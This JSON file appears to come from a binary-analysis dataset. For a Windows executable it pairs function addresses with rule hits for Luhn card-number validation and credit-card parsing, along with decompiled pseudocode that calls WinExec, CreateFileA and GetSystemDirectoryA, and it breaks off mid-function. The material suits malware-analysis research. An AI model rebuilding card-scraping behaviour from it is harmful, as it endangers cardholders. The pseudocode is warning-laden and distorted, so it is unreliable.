{
    "00401120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401120(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004039d0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x406010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00401240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004013da) overlaps instruction at (ram,0x004013d7)\n// \n// WARNING: Removing unreachable block (ram,0x004013bb)\n// WARNING: Removing unreachable block (ram,0x004013bd)\n// WARNING: Removing unreachable block (ram,0x00401310)\n// WARNING: Removing unreachable block (ram,0x00401314)\n// WARNING: Removing unreachable block (ram,0x0040141c)\n\nulong __fastcall fcn.00401240(uint32_t param_1, uint param_2, uint8_t *param_3)\n\n{\n    uint8_t **ppuVar1;\n    char **ppcVar2;\n    uint8_t uVar3;\n    char cVar4;\n    uint16_t uVar5;\n    uchar *in_EAX;\n    uchar *puVar6;\n    uint uVar7;\n    uint8_t *puVar8;\n    char *pcVar9;\n    uint8_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint8_t uVar13;\n    char *unaff_EBX;\n    uint *puVar14;\n    uchar **ppuVar15;\n    uchar **ppuVar16;\n    uint8_t *puVar17;\n    uint8_t **unaff_EDI;\n    uint8_t **ppuVar18;\n    ushort in_SS;\n    bool bVar19;\n    bool bVar20;\n    uint8_t in_AF;\n    bool bVar21;\n    bool bVar22;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar23;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    uchar uVar24;\n    uchar uVar25;\n    ushort uVar26;\n    uint16_t uStack24187;\n    uint16_t uStack24185;\n    uint8_t **ppuStack24183;\n    uchar **ppuStack88;\n    uint32_t uStack28;\n    uchar *puStack20;\n    \n    puVar14 = &stack0xfffffffc;\n    *param_3 = 8;\n    ppuVar16 = &stack0xfffffffc;\n    puStack20 = in_EAX;\n    if ((unaff_EBX != 0xffffffff) && (ppuVar16 = &stack0xfffffffc,  puStack20 = in_EAX,  unaff_EBX == 0xffffffff)) {\n        ppuStack88 = &puStack20;\n        ppuVar15 = &puStack20;\n        ppuVar16 = &puStack20;\n        cVar4 = '\\x10';\n        do {\n            puVar14 = puVar14 + -1;\n            ppuVar15 = ppuVar15 + -1;\n            *ppuVar15 = *puVar14;\n            cVar4 = cVar4 + -1;\n            puStack20 = &stack0xfffffffc;\n        } while ('\\0' < cVar4);\n    }\n    param_3[1] = 0x60;\n    param_3[2] = 0xbd;\n    uStack24187 = param_1;\n    uVar24 = param_2;\n    uVar25 = param_2 >> 8;\n    uVar26 = param_2 >> 0x10;\n    uVar11 = param_1;\n    ppuStack24183 = in_EAX;\n    do {\n        puVar6 = ppuStack24183;\n        uVar5 = uStack24187;\n        bVar19 = false;\n        bVar23 = false;\n        uVar10 = uVar11 - 5U & 0x44;\n        bVar22 = false;\n        bVar21 = uVar10 == 0;\n        uVar12 = CONCAT22(uVar26, CONCAT11(uVar25, uVar24));\n        param_3[3] = 0xaa;\n        if ((bVar21) || (ppuStack24183 = ppuStack24183 & 0xffff | uStack24187 << 0x10,  !bVar21)) {\n            param_3[4] = 0x45;\n        }\n        else {\n            ppuStack24183 = CONCAT22(uStack24187, in_SS);\n            unaff_EDI = ppuStack24183;\n            ppuStack24183 = 0x47;\n            uVar10 = puVar6;\n            bVar19 = 0xba < uVar10;\n            bVar23 = SCARRY1(uVar10, 'E');\n            uVar10 = uVar10 + 0x45;\n            puVar6 = puVar6 & 0xffffff00;\n            bVar22 = uVar10 < '\\0';\n            bVar21 = uVar10 == 0;\n        }\n        uVar11 = uStack24187;\n        bVar20 = (POPCOUNT(uVar10) & 1U) == 0;\n        ppuVar18 = unaff_EDI;\n        if (bVar22) goto code_r0x004012ca;\n        do {\n            puVar6 = CONCAT22(uVar26, CONCAT11(uVar25, uVar24));\n            ppuVar18 = unaff_EDI;\n            if (bVar22) {\n                ppuVar1 = unaff_EDI + 1;\n                puVar8 = param_3 + 4;\n                *(unaff_EDI + 7) = in_ST0;\n                ppuVar18 = unaff_EDI + 5;\n                param_3 = param_3 + 5;\n                bVar19 = *puVar8 < *ppuVar1;\n                bVar23 = SBORROW1(*puVar8, *ppuVar1);\n                cVar4 = *puVar8 - *ppuVar1;\n                bVar22 = cVar4 < '\\0';\n                bVar21 = cVar4 == '\\0';\n                bVar20 = (POPCOUNT(cVar4) & 1U) == 0;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\ncode_r0x004012ca:\n            puVar8 = CONCAT31(puVar6 >> 8, 4);\n            param_3[5] = 4;\n            if ((!bVar20) && (bVar20)) {\n                puVar14 = &uStack24187;\n                cVar4 = '\\x1e';\n                do {\n                    ppuVar16 = ppuVar16 + -1;\n                    puVar14 = puVar14 + -1;\n                    *puVar14 = *ppuVar16;\n                    cVar4 = cVar4 + -1;\n                } while ('\\0' < cVar4);\n                uVar7 = in(0x78);\n                return CONCAT44(uVar12, uVar7);\n            }\n            param_3[6] = 4;\n            uVar10 = uVar5;\n            uVar13 = unaff_EBX >> 8;\n            unaff_EDI = ppuVar18;\n            if ((bVar23 == bVar22) && (bVar23 != bVar22)) {\n                out(0xc4, puVar8);\n                uVar12 = uVar12 & 0xffffff00 | uVar12 ^ uVar10;\n                uVar24 = in_SS;\n                uVar25 = in_SS >> 8;\n                unaff_EDI = ppuVar18 + 1;\n                *ppuVar18 = puVar8;\n                bVar19 = uVar13 < *puVar8;\n                bVar23 = SBORROW1(uVar13, *puVar8);\n                cVar4 = uVar13 - *puVar8;\n                bVar22 = cVar4 < '\\0';\n                bVar21 = cVar4 == '\\0';\n                bVar20 = (POPCOUNT(cVar4) & 1U) == 0;\n            }\n            param_3[7] = 0x77;\n            if (bVar20) goto code_r0x00401337;\n            uStack24187 = puVar8;\n            puVar8 = puVar8 & 0xffff | puVar6 & 0xffff0000;\n            if (!bVar20) goto code_r0x00401337;\n            while( true ) {\n                puVar14 = segment(in_SS, *0x10 + -0x5e77);\n                uVar7 = *puVar14;\n                uVar12 = 0xb7bc9ea5;\n                if (bVar19) {\n                    *unaff_EBX = *unaff_EBX >> (uVar10 & 0x1f);\n                    *(param_3 + 0x3b) = *(param_3 + 0x3b) << 1;\n                    return CONCAT44(0xb7bc9ea5, uVar7);\n                }\n                if (bVar20) break;\n                puVar8 = uVar7;\n                ppuStack24183 = 0xb7bc9ea5;\ncode_r0x00401337:\n                param_3[8] = 0x39;\n                param_3[9] = 0x55;\n                uVar24 = SUB41(unaff_EDI, 0);\n                uVar25 = unaff_EDI >> 8;\n                uVar26 = unaff_EDI >> 0x10;\n                uStack24187 = puVar8;\n                bVar19 = (POPCOUNT(uStack24187 & 0xcb) & 1U) == 0;\n                param_3[10] = 199;\n                if ((bVar19) || (!bVar19)) {\ncode_r0x0040139a:\n                    param_3[0xb] = 0x4e;\n                    bVar19 = (uVar5 - 1 & unaff_EDI | 0x61be) != 0;\n                    param_3[0xc] = 0x99;\n                    param_3[0xd] = 0xc9;\n                    if ((bVar19) && (!bVar19)) {\n                        do {\n    // WARNING: Do nothing block with infinite loop\n                        } while( true );\n                    }\n                    param_3[0xe] = 0xf4;\n                    param_3[0xf] = 0x73;\n                    uVar10 = uVar12 ^ uVar13 | 0x67;\n                    bVar21 = uVar10 < '\\0';\n                    bVar19 = (POPCOUNT(uVar10) & 1U) == 0;\n                    param_3[0x10] = 0x67;\n                    puVar17 = param_3;\n                    if ((!bVar19) && (bVar19)) {\n                        puVar17 = *unaff_EDI;\n                        *unaff_EDI = param_3;\n                        ppuVar16 = ppuVar16 - *(ppuVar16 + 0x5f9dff63);\n                        uStack28 = param_1;\n                        if (ppuVar16 < 0) {\n                            uVar10 = puVar8;\n                            cVar4 = uVar10 - *unaff_EDI;\n                            uStack24187 = (in_NT & 1) * 0x4000 | SBORROW1(uVar10, *unaff_EDI) * 0x800 |\n                                          (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 | (cVar4 < '\\0') * 0x80 |\n                                          (cVar4 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                                          ((POPCOUNT(cVar4) & 1U) == 0) * 4 | uVar10 < *unaff_EDI;\n                            uStack24185 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n                            func_0x10187337();\n    // WARNING: Bad instruction - Truncating control flow here\n                            halt_baddata();\n                        }\n                        bVar21 = puVar17 < 0;\n                        if (!bVar21) {\n                            uStack24187 = ppuVar16 + -0x1a;\n                            uStack24185 = ppuVar16 + -0x1a >> 0x10;\n                            ppuStack24183 = puVar8;\n                            fcn.00401240();\n                            uVar7 = fcn.00402d00(ppuVar16 + -0x1a, ppuVar16[-1], 0x406014, 0xa4a0);\n                            puVar14 = ppuVar16[3];\n                            *ppuVar16[2] = 0x406014;\n                            *puVar14 = 0xa4a0;\n                            return CONCAT44(puVar14, uVar7);\n                        }\n                    }\n                    puVar17[0x11] = 0xe6;\n                    if ((!bVar21) && (bVar21)) {\n                        *(unaff_EDI + 7) = in_ST0;\n                    }\n                    puVar14 = ppuVar16[3];\n                    *puVar14 = 0x12;\n                    return CONCAT44(uVar12, puVar14);\n                }\n                ppcVar2 = segment(in_SS, *0x10 + -0x5e77);\n                pcVar9 = *ppcVar2;\n                uVar12 = 0xb7bc9ea5;\n                if (!bVar19) {\n                    puVar8 = pcVar9;\n                    ppuStack24183 = 0xb7bc9ea5;\n                    goto code_r0x0040139a;\n                }\n                uVar3 = pcVar9 + *pcVar9;\n                puVar8 = pcVar9 & 0xffffff00 | uVar3;\n                bVar19 = CARRY1(*puVar8, uVar3);\n                bVar23 = SCARRY1(*puVar8, uVar3);\n                *puVar8 = *puVar8 + uVar3;\n                bVar22 = *puVar8 < '\\0';\n                bVar21 = *puVar8 == 0;\n                bVar20 = (POPCOUNT(*puVar8) & 1U) == 0;\n            }\n        } while (!bVar19 && !bVar21);\n    } while( true );\n}\n",
        "token_count": 3303
    },
    "00401590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004017dd) overlaps instruction at (ram,0x004017d8)\n// \n// WARNING: Removing unreachable block (ram,0x004015d9)\n// WARNING: Removing unreachable block (ram,0x004015e5)\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __cdecl fcn.00401590(char *arg_8h, int32_t *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    unkuint3 *pVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    uint arg_ch_00;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    uchar *puVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    bool bVar10;\n    unkbyte6 Var11;\n    unkuint3 Stack551;\n    uchar *puStack552;\n    uint uStack548;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar7 = &var_20fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    puVar7 = &s + 1;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    puStack552 = &lpBuffer;\n    uStack548 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0xd4, 0xec, arg_8h);\n    fcn.00401460(0xf4, 0xf8);\n    puVar6 = 0x1;\n    uVar3 = fcn.00403430(arg_8h, arg_ch, arg_10h, arg_14h, var_8h, var_4h);\n    bVar10 = uVar3 == 0;\n    bVar9 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n    if (bVar10) {\n        return NULL;\n    }\n    if ((!bVar10) && (bVar10)) {\n        bVar9 = (POPCOUNT(&Stack551 & 0xff) & 1U) == 0;\n    }\n    puStack552 = puStack552 & 0xffffff00;\n    *0x41fa04 = fcn.00401ba0();\n    if ((bVar9) || (puStack552 = puStack552 & 0xffffff00,  uVar3 = *0x41fa04,  arg_ch_00 = extraout_ECX,  !bVar9)) {\n        uVar3 = var_4h;\n        arg_ch_00 = var_8h;\n    }\n    *(arg_8h + 0x4d8bfc45) = *(arg_8h + 0x4d8bfc45) | 0xfffffff8;\n    puStack552 = puStack552 & 0xffffff00 | uVar3 >> 0x18;\n    Var11 = fcn.00402880(&s, arg_ch_00, uVar3);\n    bVar9 = Var11 == 0;\n    if (bVar9) {\n        return NULL;\n    }\n    if ((bVar9) || (puStack552 = puStack552 & 0xffffff00,  !bVar9)) {\ncode_r0x004016ce:\n        Stack551 = puStack552 >> 8;\n        iVar5 = fcn.004023e0();\n        piVar8 = arg_ch + 1;\n        puVar6 = 0x5;\n        *arg_ch = *0x1;\n        *0xd0222 = *0xd0222 + -0x18;\n        puVar1 = iVar5 + -0x357fb11d;\n        *puVar1 = *puVar1 << 1 | *puVar1 < '\\0';\n        *arg_8h = *arg_8h << 1;\n        puVar1 = iVar5 + -0x8fdc309;\n        *puVar1 = *puVar1 << 1 | *puVar1 < '\\0';\n        puStack552 = Stack551 << 8;\n        iVar5 = fcn.00401e10(0x41050c);\n        if (iVar5 == -1) {\n            puStack552 = puStack552 & 0xffffff00;\n            iVar5 = fcn.00401e10(0x410500);\n            if (iVar5 == -1) goto code_r0x0040176c;\n            arg_14h = 0xf;\n        }\n        else {\n            arg_14h = 0xe;\n        }\n    }\n    else {\n        piVar8 = arg_ch + 1;\n        iVar5 = in(Var11 >> 0x20);\n        *arg_ch = iVar5;\n        if (0 < &Stack551) {\n            *0xdee0001c = *0xdee0001c ^ Var11 >> 0x28;\n            arg_ch = piVar8;\n            goto code_r0x004016ce;\n        }\n    }\n    puStack552 = puStack552 & 0xffffff00 | piVar8 >> 0x18;\n    iVar5 = fcn.00402b50(arg_8h);\n    if (iVar5 != 0) {\n        puStack552 = puStack552 & 0xffffff00 | arg_14h >> 0x18;\n        fcn.00401f40();\n        fcn.004031d0(arg_14h);\n        return 0x1;\n    }\n    if (*0x41fa04 == 0) {\n        return NULL;\n    }\ncode_r0x0040176c:\n    Stack551 = puStack552 >> 8;\n    iVar5 = fcn.00401090(arg_8h, &s);\n    if (iVar5 == 0) {\n        puVar6 = NULL;\n    }\n    iVar5 = extraout_ECX_00;\n    if ((puVar6 != NULL) && (iVar4 = fcn.00401da0(arg_8h),  iVar5 = extraout_ECX_01,  iVar4 == 0)) {\n        puVar6 = NULL;\n    }\n    puStack552 = Stack551 << 8;\n    pVar2 = puVar6;\n    if (puVar6 == NULL) {\n        puStack552 = Stack551 << 8;\n        puVar6 = fcn.00402170(arg_8h);\n        iVar5 = extraout_ECX_02;\n        pVar2 = &Stack551;\n    }\n    if ((pVar2 < 0) || (pVar2 >= 0)) {\n        bVar10 = false;\n        bVar9 = puVar6 == NULL;\n        if (bVar9) goto code_r0x004017ee;\n    }\n    while( true ) {\n        puStack552 = puStack552 & 0xffffff00 | 0xff;\n        fcn.004031d0();\n        bVar10 = 0xfffffffb < &stack0xfffffdd5;\n        bVar9 = *0x10 == 0x227;\n        iVar5 = extraout_ECX_03;\ncode_r0x004017ee:\n        if ((bVar10) || (!bVar10)) break;\n        if (iVar5 == 1 || !bVar9) {\n            *piVar8 = puVar6 + 4;\n            puVar6 = 0x68b8ec44;\n            puStack552 = puStack552 & 0xffffff00;\n            func_0xff401810();\ncode_r0x00401812:\n            puStack552 = puStack552 & 0xffffff00;\n            (*_sym.imp.KERNEL32.dll_WinExec)(0x20);\n            return puVar6;\n        }\n    }\n    puStack552 = puStack552 & 0xffffff00;\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    goto code_r0x00401812;\n}\n",
        "token_count": 1968
    },
    "004014e0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014e0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00402490": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004025b4) overlaps instruction at (ram,0x004025b3)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00402490(void)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    int32_t extraout_ECX;\n    char *unaff_EBX;\n    uint *unaff_EDI;\n    uint *puVar6;\n    uint32_t *puVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    bVar8 = (POPCOUNT(&var_80h & 0xff) & 1U) == 0;\n    if ((bVar8) || (!bVar8)) {\n        in_EAX = fcn.00402a20();\n    }\n    if (in_EAX == 0x3f7b0073) {\n        fcn.00402630();\n        return false;\n    }\n    fcn.00402960();\n    iVar3 = fcn.00401e10(0x410518);\n    bVar8 = iVar3 == -1;\n    if (!bVar8) {\n        iVar3 = fcn.00401e10(0x41050c);\n        if (iVar3 == -1) {\n            fcn.00402630();\n        }\n        return false;\n    }\n    uVar9 = fcn.004041b0();\n    uVar4 = uVar9;\n    if ((bVar8) || (!bVar8)) {\n        pcVar5 = func_0x00402e00();\ncode_r0x0040254f:\n        if (pcVar5 != NULL) {\n            return false;\n        }\n        iVar3 = 7;\n        uVar9 = 0;\n        puVar7 = &var_1fh;\n        var_20h = 0;\n    }\n    else {\n        puVar7 = unaff_EDI + 1;\n        uVar1 = in(uVar9 >> 0x20);\n        *unaff_EDI = uVar1;\n        if (0 < &stack0xffffff70) {\n            uVar4 = uVar4 ^ 0xdee0ed6d;\n            uVar2 = uVar4 + (uVar4 >> 8) * -0x31 ^ extraout_ECX >> 8;\n            pcVar5 = uVar4 & 0xffff0000 | uVar2;\n            *pcVar5 = *pcVar5 + uVar2;\n            goto code_r0x0040254f;\n        }\n        iVar3 = extraout_ECX;\n        if (&stack0xffffff70 < 1) goto code_r0x004025b6;\n        *unaff_EBX = *unaff_EBX + (uVar9 >> 0x28);\n    }\n    var_80h._0_1_ = uVar9 >> 0x20;\n    for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = uVar9;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = uVar9;\n    *(puVar7 + 2) = uVar9;\n    puVar6 = &var_80h + 1;\n    var_60h._0_1_ = var_80h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = &var_60h + 1;\n    var_40h._0_1_ = var_80h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    iVar3 = 7;\n    uVar4 = 0;\n    puVar7 = &var_40h + 1;\ncode_r0x004025b6:\n    for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = uVar4;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = uVar4;\n    *(puVar7 + 2) = uVar4;\n    iVar3 = fcn.00402ba0(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar3 == 0) {\n        return false;\n    }\n    iVar3 = fcn.00401870(&var_20h);\n    if (iVar3 == 0) {\n        return false;\n    }\n    iVar3 = fcn.00401590(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar3 != 0;\n}\n",
        "token_count": 1196
    },
    "00403430": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00403430(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *arg_20h;\n    uint16_t unaff_BX;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    ulong uVar7;\n    uchar var_24h;\n    uint var_23h;\n    uint uStack32;\n    uint var_4h;\n    \n    bVar6 = ((CONCAT11(in_EAX >> 8 & in_EDX >> 8, in_EAX) * 2 | in_EDX) ^ 0x6c00) != unaff_BX;\n    if ((bVar6) && (!bVar6)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar7 = fcn.00402720(arg_18h, arg_1ch, 0x4104f8, 7);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    if (uVar7 != 0) {\n        var_24h = 0;\n        puVar4 = &fcn.00403430::var_23h;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        uVar3 = 0;\n        puVar4 = uVar7 >> 0x20;\n        do {\n            arg_20h = puVar4;\n            uVar7 = (*pcVar1)();\n            (&stack0xffffffd8)[uVar3] = uVar7;\n            uVar3 = uVar3 + 1;\n            puVar4 = uVar7 >> 0x20;\n        } while (uVar3 < 0x20);\n        puVar4 = &stack0xffffffd8;\n        puVar5 = arg_20h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        uStack32 = 0x40356e;\n        fcn.004035f0(arg_8h, arg_ch, arg_10h, arg_14h, &stack0xffffffd8, 0x20, arg_20h);\n        fcn.00403940(arg_18h, arg_1ch);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 684
    },
    "00403a60": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404017) overlaps instruction at (ram,0x00404015)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403f67)\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.00403a60(void)\n\n{\n    uint8_t *puVar1;\n    uint8_t extraout_AH;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t extraout_CL;\n    int16_t extraout_CX;\n    uchar *extraout_ECX;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint8_t uVar5;\n    int32_t extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    uint8_t extraout_DL;\n    uint8_t extraout_DH;\n    int32_t extraout_EDX;\n    char *pcVar6;\n    int32_t extraout_EDX_00;\n    uint extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    uint32_t unaff_EBX;\n    uint *unaff_EBP;\n    uint16_t uVar7;\n    int32_t unaff_ESI;\n    uint *puVar8;\n    int32_t *unaff_EDI;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    bool bVar11;\n    uchar uVar12;\n    uint8_t uVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    char cVar15;\n    uchar uVar16;\n    bool bVar17;\n    char cVar18;\n    uchar uVar19;\n    unkbyte10 extraout_ST0;\n    ulong uVar20;\n    uint unaff_retaddr;\n    uint uVar21;\n    uint uVar22;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uchar uStack8;\n    uchar uStack7;\n    ushort uStack6;\n    \n    uStack8 = unaff_ESI;\n    uStack7 = unaff_ESI >> 8;\n    uStack6 = unaff_ESI >> 0x10;\n    uStack16 = 10;\n    uStack20 = 0x4104c8;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403a84;\n    fcn.00403290();\n    puStack28 = 0x12;\n    uStack32 = 0x4104d4;\n    fcn.00403290(0x41f9c0);\n    uStack16 = 0x4104e8;\n    uStack20 = 0xc;\n    uStack24 = 0x41f9c0;\n    puStack28 = 0x403ac3;\n    fcn.00403290();\n    bVar11 = extraout_DH < extraout_CL;\n    bVar17 = SBORROW1(extraout_DH, extraout_CL);\n    bVar14 = extraout_DH == extraout_CL;\n    uStack16 = 0x4104ec;\n    uStack20 = 0xc;\n    uStack24 = 0x41f9c0;\n    puStack28 = 0x403ae4;\n    fcn.00403290();\n    if ((bVar17) || (!bVar17)) {\ncode_r0x00403afd:\n        puStack28 = 0x56;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*extraout_ECX, unaff_EBX);\n        *(extraout_EDX + 0xc) = *(extraout_EDX + 0xc) + (extraout_ECX >> 8);\n        uStack32 = 0x41f9c0;\n        fcn.00403290();\n        uStack16 = 0x41f9c0;\n        uStack20 = 0x403b46;\n        fcn.00403290();\n        uStack8 = 0xc;\n        uStack7 = 5;\n        uStack6 = 0x41;\n        uStack24 = 0xc;\n        piVar9 = unaff_EDI;\n    }\n    else {\n        piVar9 = unaff_EDI + 1;\n        uVar12 = in(extraout_EDX);\n        *unaff_EDI = uVar12;\n        unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n        unaff_EDI = piVar9;\n        if (bVar11 || bVar14) goto code_r0x00403afd;\n        *(extraout_EDX + 0xc) = *(extraout_EDX + 0xc) + (extraout_ECX + 1 >> 8);\n    }\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403b81;\n    fcn.00403290();\n    bVar11 = false;\n    bVar14 = (extraout_CH | extraout_DL | 0x1f) == 0;\n    uStack16 = 8;\n    uStack20 = 0x410518;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403ba4;\n    uVar2 = fcn.00403290();\n    if ((!bVar14) && (bVar14)) {\n        unaff_EBX = unaff_EBX + 1;\n        if (bVar11 || unaff_EBX == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar10 = (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar10 = *piVar10 - unaff_EBX;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    uStack32 = 0xd;\n    fcn.00403290(0x41f9c0, 0xc);\n    uStack16 = 0x18;\n    uStack20 = 0x410530;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403bff;\n    fcn.00403290();\n    uStack16 = 0x25;\n    uStack20 = 0x410548;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403c21;\n    fcn.00403290();\n    uStack16 = 10;\n    uStack20 = 0x410570;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403c48;\n    iVar3 = unaff_ESI;\n    fcn.00403290();\n    uStack16 = 0xc;\n    uStack20 = 0x41057c;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403c81;\n  